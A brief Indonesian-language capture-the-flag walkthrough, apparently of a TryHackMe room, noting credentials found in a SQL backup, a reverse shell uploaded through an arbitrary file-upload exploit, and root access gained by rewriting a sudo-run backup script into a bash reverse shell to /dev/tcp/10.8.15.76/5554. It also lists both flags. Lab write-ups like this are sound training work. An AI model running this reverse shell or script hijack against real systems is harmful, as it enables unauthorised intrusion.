Enum, enum /content, cari2 dapet backup sql. Dapet credential
- manager
- Password123 (42f749ade7f9e195bf475f37a44cafcb)

rice:randompass

upload revshell via exploit-db upload file arbitary.

www-data@THM-Chal:/home/itguy$ cat user.txt
cat user.txt
THM{63e5bce9271952aad1113b6f1ac28a07}

karena bisa sudo perl sambil backup.pl, kita ganti copy.sh-nya jadi revshell bash 
- echo "bash -c 'exec bash -i &>/dev/tcp/10.8.15.76/5554 <&1'" > copy.sh

www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl

root@THM-Chal:~# cat root.txt
cat root.txt
THM{6637f41d0177b6f37cb20d775124699f}
